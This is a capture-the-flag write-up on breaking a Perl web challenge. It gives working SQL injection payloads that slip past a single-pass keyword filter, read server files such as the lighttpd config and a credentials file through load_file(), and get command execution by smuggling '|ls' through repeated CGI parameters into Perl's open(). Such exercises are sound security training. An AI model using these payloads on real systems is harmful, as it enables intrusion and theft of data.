We need to upload a PGP public key file so the website will parse it.
The PGP can contain an SQLi in the email field. Michael A. wrote a script to make everything easier, 
The trick will now be the SQLi itself.

At first, we thought about fetching the users so we could use an activated user perhaps. 
To do this we must first find which table stores them.

## Basic SQLi
The server doesn't sanitize ', so we can just easily inject code.
However, the server does sanitize "union" and "select" among some special characters - the easiest way to check is entering 
a valid SQL query with testing AFTER the comment.

for instance the query

  email = "A' or 1 # union select ()<>?!%= "

Will return something along 
	"A' or 1 #<" 
(so just < isn't sanitized here)

**Incidentally every character is sanitized only once**, so

  email = "A' or 1 # == "

will return

  "A' or 1 # = "

## Getting the users table/columns (Ultimately not useful)  
[This](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet1 
) cheatsheet contains a lot of useful queries, like how to get a list of the tables and of columns:

To get (All) the tables we use:

  ```email = "A' UNunionION SELselectECT table_name,1,1,1,1 FROM information_schema.tables # "```

"table_name" has to be first, because only the first column is shown to the user.

The last table in the response is :

```"information_schema.tables # </br>[different key]</br>
(accounts) A' UNION SELECT table_name,1,1,1,1 FROM"```

So we can see the table name is "accounts"

To get all the coulmns from all of the tables we use:


  email = "A' UNunionION SELselectECT column_name,1,1,1,1 FROM information_schema.columns # "
  
Which returns 

 ```information_schema.columns # </br>[different key]</br>
(path) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(user_id) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(pass) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>
(activated) A' UNION SELECT column_name,1,1,1,1 FROM information_schema.columns # </br>[different key]</br>```


Too bad there are no activated users, which can be verified with 

  ```email = "A' UNunionION SELselectECT activated,1,1,1,1 FROM accounts"```

Trying to insert an activated user or to update one also didn't work...

## Solution

We're interested in the source code, but to know where it is we need to check lighttpd.conf first - because the website is powered by lighttpd.
We can't deliver straight ASCII, because we might have characters which will bang the SQL query.

We can use mySQL's load_file() to load a file, and hex() to encode it into hex:

So to get the [configuration](lighttpd.conf) we can use the following query:

```email = "A' UNunionION SELselectECT ()hex(load_file('/etc/lighttpd/lighttpd.conf')),1,1,1,1 #"```

The result contains the name of our [index page (source)](index.pl), to get it we use:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/public/index.pl')),1,1,1,1 #"```

Inside we can see that the flag is loaded from '../private/config.ini', so we get the flag:

```email = "A' UNunionION SELselectECT ()hex(load_file('/var/www/html/private/config.ini')),1,1,1,1 #"```

which gives us:

>[Database] Password=BlulS@ablul [CTF] Flag=ILov3P3rl43v3r



## RCE

Inside the index page there are no exec() or system() functions, so RCE is not really straight forward.
However, googling for "perl open() rce" landed me on [this](http://www.cgisecurity.com/lib/sips.html) page, which includes a section about how open() can be used for RCE:
>If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.

open() is being called from the get_template subroutine:

	sub get_template {
		my $filename = shift;

		open (FILE, $filename);
		my $output = <FILE>;
		close(FILE);

		return $output;
	}

Which is being called from  print_template:

	sub print_template {
		my $filename = shift;

		print get_template($filename);
	}

This function is called 3 times, each time with an argument from the list :

	my %templates = (
		header => 'templates/header.html',
		footer => 'templates/footer.html',
		form => 'templates/form.html',
		error => $query->param('error')
	);

"error" can be injected into, in the form of a parameter.
As I learned from [this](http://www.youtube.com/watch?v=noQcWra6sbU&t=6m33s) talk Perl has a weird way of expanding hashes using lists, and in CGI using one parameter multiple times will create a list.

We can use the same method to insert an arbitrary command to open.
Any of the other variables (header, footer or form) can be replaced with a command in the following way:

`http://<IP>/public/index.pl?error=e&error=form&error=|ls`

Where the second parameter will be the variable we want to inject into, and the third will be the command executed. 
We get the output piped to us.


